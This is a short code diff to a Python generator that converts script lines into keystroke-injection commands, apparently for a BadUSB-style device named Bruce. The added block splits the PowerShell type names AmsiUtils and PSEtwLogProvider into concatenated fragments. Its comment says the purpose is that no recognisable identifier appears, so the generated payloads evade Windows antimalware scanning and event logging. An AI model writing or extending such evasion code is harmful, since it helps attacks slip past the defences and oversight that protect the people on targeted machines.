@@ -164,6 +164,17 @@ def _bruce(lines: list, ble_name: str) -> str:
     ]
     for i, line in enumerate(lines):
         clean = re.sub(r'[^\x00-\x7f]', '', line)
+        # Re-obfuscate AMSI sentinel type names that became plaintext after ZWSP strip.
+        # Bruce strips non-ASCII so the ZWSP trick no longer hides these — use PS1
+        # string concatenation instead so no recognisable identifier appears in the script.
+        for _plain, _split in (
+            ("System.Management.Automation.AmsiUtils",
+             "('Sys'+'tem.Manage'+'ment.Auto'+'mation.Amsi'+'Utils')"),
+            ("System.Management.Automation.PSEtwLogProvider",
+             "('Sys'+'tem.Manage'+'ment.Auto'+'mation.PSEtw'+'LogPro'+'vider')"),
+        ):
+            if _plain in clean:
+                clean = clean.replace(f"'{_plain}'", _split)
         out.append(f"STRING {clean}")
         out.append("ENTER")
         out.append(f"DELAY {_LINE_MS}")
